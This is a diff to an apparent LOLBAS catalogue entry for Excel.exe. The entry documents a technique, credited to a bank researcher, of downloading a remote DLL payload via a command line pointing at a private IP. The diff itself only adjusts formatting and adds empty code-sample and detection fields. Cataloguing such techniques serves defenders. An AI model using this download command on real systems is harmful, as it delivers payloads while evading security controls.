@@ -1,10 +1,10 @@
 ---
 Name: Excel.exe
-Description: Microsoft Office binary.
+Description: Microsoft Office binary
 Author: 'Reegun J (OCBC Bank)'
 Created: '2019-07-19'
 Commands:
-  - Command: Excel.exe "http://192.168.1.10/TeamsAddinLoader.dll"
+  - Command: Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
     Description: Downloads payload from remote server
     Usecase: It will download a remote payload and place it in the cache folder
     Category: Download
@@ -28,10 +28,14 @@ Full_Path:
   - Path: C:\Program Files (x86)\Microsoft Office\Office12\Excel.exe
   - Path: C:\Program Files\Microsoft Office\Office12\Excel.exe
   - Path: C:\Program Files\Microsoft Office\Office12\Excel.exe
+Code_Sample:
+  - Code:
+Detection:
+  - IOC:
 Resources:
   - Link: https://twitter.com/reegun21/status/1150032506504151040
   - Link: https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
 Acknowledgement:
-  - Person: Reegun J (OCBC Bank)
+  - Person: 'Reegun J (OCBC Bank)'
     Handle: '@reegun21'
 ---
